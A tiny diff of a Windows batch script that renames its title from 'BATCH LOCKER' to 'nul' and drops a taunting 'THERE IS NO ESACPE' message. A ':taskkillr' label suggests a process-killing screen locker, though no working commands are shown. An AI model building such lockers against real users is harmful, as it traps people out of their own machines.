@@ -1,6 +1,5 @@
 @echo off
-title BATCH LOCKER
-echo THERE IS NO ESACPE HAHAHA
+title nul
 
 :taskkillr
 set "kill=none"
